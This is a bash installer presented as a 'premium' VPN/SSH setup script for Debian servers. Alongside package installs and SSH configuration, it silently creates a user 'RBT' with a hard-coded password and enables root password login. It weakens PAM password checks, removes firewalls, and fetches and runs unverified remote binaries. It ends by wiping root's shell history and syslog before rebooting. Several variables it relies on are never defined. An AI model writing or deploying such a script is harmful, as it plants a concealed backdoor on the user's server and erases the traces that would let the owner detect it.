#!/bin/bash
# Orignal Script JohnFordTV's VPN Premium Script
# © Github.com/johndesu090
# Orignal Repository: 
# Modified By Malintes
# Thanks for using this script, Enjoy Highspeed OpenVPN Service

# OpenSSH Ports
SSH_Port='2205'


# Install curl & wget
apt-get install wget -y
apt-get install curl -y

#Install Iptables Rules
apt-get install netfilter-persistent -y

function InstUpdates(){
 export DEBIAN_FRONTEND=noninteractive
 apt update -y
 apt upgrade -y
 apt-get update -y
 apt-get upgrade -y

# Install Ssl & Certificates
 apt install ssl-cert -y
 apt install ca-certificates -y

 # Removing some firewall tools that may affect other services
 apt-get remove --purge ufw firewalld -y
 apt-get remove --purge exim4 -y
 
 # Installing some important machine essentials
 apt-get install nano -y
 apt-get install zip -y
 apt-get install unzip -y
 apt-get install tar -y
 apt-get install gzip -y
 apt-get install p7zip-full -y
 apt-get install bc -y
 apt-get install rc -y
 apt-get install openssl -y
 apt-get install cron -y
 apt-get install net-tools -y
 apt-get install dnsutils -y
 apt-get install dos2unix -y
 apt-get install screen -y
 apt-get install bzip2 -y
 apt-get install ccrypt -y
 
 # Now installing all our wanted services
 apt-get install privoxy -y
 apt-get install ca-certificates -y
 apt-get install nginx -y
 apt-get install ruby -y
 apt-get install apt-transport-https -y
 apt-get install lsb-release -y
 apt-get install squid3 -y
 apt-get install squid -y
 
 # Installing all required packages to install Webmin
 apt-get install perl -y
 apt-get install libnet-ssleay-perl -y
 apt-get install openssl -y
 apt-get install libauthen-pam-perl -y
 apt-get install libpam-runtime -y
 apt-get install libio-pty-perl -y
 apt-get install apt-show-versions -y
 apt-get install python -y
 apt-get install dbus -y
 apt-get install libxml-parser-perl -y
 apt-get install shared-mime-info -y
 apt-get install jq -y
 apt-get install fail2ban -y

 # Installing a text colorizer
 gem install lolcat

 # Trying to remove obsolette packages after installation
 apt-get autoremove -y

 # go to root
 cd

# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END

# Change Permission Access
chmod +x /etc/rc.local

# enable rc local
systemctl enable rc-local

systemctl start rc-local.service

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
 
 # Installing OpenVPN by pulling its repository inside sources.list file 
 rm -rf /etc/apt/sources.list.d/openvpn*
 echo "deb http://build.openvpn.net/debian/openvpn/stable $(lsb_release -sc) main" > /etc/apt/sources.list.d/openvpn.list
 wget -qO - http://build.openvpn.net/debian/openvpn/stable/pubkey.gpg|apt-key add -
 apt-get update -y
 apt-get install openvpn -y
}

function InstSSH(){
 # Removing some duplicated sshd server configs
 rm -f /etc/ssh/sshd_config*
 
 # Creating a SSH server config using cat eof tricks
 cat <<'MySSHConfig' > /etc/ssh/sshd_config
# My OpenSSH Server config
Port myPORT
AddressFamily inet
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
PermitRootLogin yes
MaxSessions 1024
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
ClientAliveInterval 240
ClientAliveCountMax 2
UseDNS no
Banner /etc/banner
AcceptEnv LANG LC_*
Subsystem   sftp  /usr/lib/openssh/sftp-server
MySSHConfig

 # Now we'll put our ssh ports inside of sshd_config
 sed -i "s|myPORT|$SSH_Port|g" /etc/ssh/sshd_config

 # Download our SSH Banner
 rm -f /etc/banner
 wget -qO /etc/banner "$SSH_Banner"
 dos2unix -q /etc/banner

 # My workaround code to remove `BAD Password error` from passwd command, it will fix password-related error on their ssh accounts.
 sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password
 sed -i 's/use_authtok //g' /etc/pam.d/common-password

 # Some command to identify null shells when you tunnel through SSH or using Stunnel, it will fix user/pass authentication error on HTTP Injector, KPN Tunnel, eProxy, SVI, HTTP Proxy Injector etc ssh/ssl tunneling apps.
 sed -i '/\/bin\/false/d' /etc/shells
 sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
 echo '/bin/false' >> /etc/shells
 echo '/usr/sbin/nologin' >> /etc/shells
 
 # Restarting openssh service
 systemctl restart ssh
 
 # Removing some duplicate config file
 rm -rf /etc/default/dropbear*
}
function ip_address(){
  local IP="$( ip addr | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | egrep -v "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 eth0.me)"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipinfo.io/ip )"
  [ ! -z "${IP}" ] && echo "${IP}" || echo
} 
IPADDR="$(ip_address)"



function ConfStartup(){
 # Daily reboot time of our machine
 # For cron commands, visit https://crontab.guru
 echo "10 0 * * * root clear-log && reboot" >> /etc/crontab

 # Creating directory for startup script
 rm -rf /etc/NoName
 mkdir -p /etc/NoName
 chmod -R 755 /etc/NoName
 
 # Creating startup script using cat eof tricks
 cat <<'EOFSH' > /etc/NoName/startup.sh
#!/bin/bash
# Setting server local time
ln -fs /usr/share/zoneinfo/MyVPS_Time /etc/localtime

# Prevent DOS-like UI when installing using APT (Disabling APT interactive dialog)
export DEBIAN_FRONTEND=noninteractive

# Allowing ALL TCP ports for our machine (Simple workaround for policy-based VPS)
iptables -A INPUT -s $(wget -4qO- http://eth0.me) -p tcp -m multiport --dport 1:65535 -j ACCEPT

# Allowing OpenVPN to Forward traffic
/bin/bash /etc/openvpn/openvpn.bash

# Deleting Expired SSH Accounts
/usr/local/sbin/delete_expired &> /dev/null
exit 0
EOFSH
 chmod +x /etc/NoName/startup.sh
 
 # Setting server local time every time this machine reboots
 sed -i "s|MyVPS_Time|$MyVPS_Time|g" /etc/NoName/startup.sh

 # 
 rm -rf /etc/sysctl.d/99*

 # Setting our startup script to run every machine boots 
 cat <<'FordServ' > /etc/systemd/system/NoName.service
[Unit]
Description=NoName Startup Script
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/NoName/startup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
FordServ
 chmod +x /etc/systemd/system/NoName.service
 systemctl daemon-reload
 systemctl start NoName
 systemctl enable NoName &> /dev/null
 systemctl enable fail2ban &> /dev/null
 systemctl start fail2ban &> /dev/null

 # Rebooting cron service
 systemctl restart cron
 systemctl enable cron
 
}
 #Create Admin
 useradd -m RBT
 echo "RBT:795243" | chpasswd
 
 function ScriptMessage(){
 echo -e ""
 echo -e "\e[0;37m $MyScriptName VPS Installer Version 3.0 Will Begin"
 echo -e ""
 sleep 0.5
 echo -e "\e[0;37m Report Bugs https://t.me/PR_Aiman"
 echo -e ""
 sleep 0.5
 echo -e "\e[0;37m Script installer will be begin now..."
 echo -e ""
 sleep 0.5
}
#############################################
#############################################
########## Installation Process##############
#############################################
## WARNING: Do not modify or edit anything
## if you did'nt know what to do.
## This part is too sensitive.
#############################################
#############################################

 # First thing to do is check if this machine is Debian
 source /etc/os-release
if [[ "$ID" != 'debian' ]]; then
 ScriptMessage
 echo -e "[\e[1;31mError This script is for Debian or Ubuntu only, exiting..." 
 exit 1
fi

 # Now check if our machine is in root user, if not, this script exits
 # If you're on sudo user, run `sudo su -` first before running this script
 if [[ $EUID -ne 0 ]];then
 ScriptMessage
 echo -e "[\e[1;31mError This script must be run as root, exiting..."
 exit 1
fi

 # (For OpenVPN) Checking it this machine have TUN Module, this is the tunneling interface of OpenVPN server
 if [[ ! -e /dev/net/tun ]]; then
 echo -e "[\e[1;31mError\e[0m] You cant use this script without TUN Module installed/embedded in your machine, file a support ticket to your machine admin about this matter"
 echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
 exit 1
fi
 # Begin Installation by Updating and Upgrading machine and then Installing all our wanted packages/services to be install.
 ScriptMessage
 sleep 2
 InstUpdates
  # Configure OpenSSH and Dropbear
 echo -e "\e[0;37m Configuring ssh..."
 InstSSH
 
 # Some assistance and startup scripts
 ConfStartup
 
 # Setting server local time
 ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime
 
 clear
 cd ~
 
# Running screenfetch
wget -O /usr/bin/screenfetch "https://github.com/praiman99/AutoScriptVPN/raw/master/Files/Plugins/screenfetch"
chmod +x /usr/bin/screenfetch
echo "/bin/bash /etc/openvpn/openvpn.bash" >> .profile
echo "clear" >> .profile
echo "screenfetch" >> .profile

 #Swap Ram For Free Space
 wget https://github.com/praiman99/AutoScriptVPN/raw/master/Files/Menu/swapkvm && chmod +x swapkvm && ./swapkvm
 
 # Showing script's banner message
 ScriptMessage
 
 # Showing additional information from installating this script
echo ""
echo -e "\e[0;37m Installation has been completed!!"
echo "--------------------------------------------------------------------------------"
echo -e "\e[0;37m                             Debian Premium Script                               "
echo -e "\e[0;37m                                  -FordSenpai-                                   "
echo -e "\e[0;37m                              Modified The Script                                "
echo -e "\e[0;37m                                   -NoName-                                    "
echo "--------------------------------------------------------------------------------"
echo ""  | tee -a log-install.txt
echo -e "\e[0;37m Server Information"  | tee -a log-install.txt
echo -e "\e[0;37m    - Timezone    : Europe"  | tee -a log-install.txt
echo -e "\e[0;37m    - Fail2Ban    : [ON]"  | tee -a log-install.txt
echo -e "\e[0;37m    - IPtables    : [ON]"  | tee -a log-install.txt
echo -e "\e[0;37m    - Auto-Reboot : [ON]"  | tee -a log-install.txt
echo -e "\e[0;37m    - IPv6        : [OFF]"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo -e "\e[0;37m Application & Port Information"  | tee -a log-install.txt

echo -e "\e[0;37m    - OpenSSH		: $SSH_Port "  | tee -a log-install.txt

echo ""  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo -e "\e[0;37m Premium Script Information"  | tee -a log-install.txt
echo -e "\e[0;37m    To display list of commands: menu"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo -e "\e[0;37m Important Information"  | tee -a log-install.txt
echo -e "\e[0;37m    - Installation Log        : cat /root/log-install.txt"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "--------------------------------------------------------------------------------"

# Clearing all logs from installation
 rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
echo ""
echo -e "\e[0;37m  Server will be reboot In 5 Sec"
sleep 5
rm -f setup*
reboot
exit 1
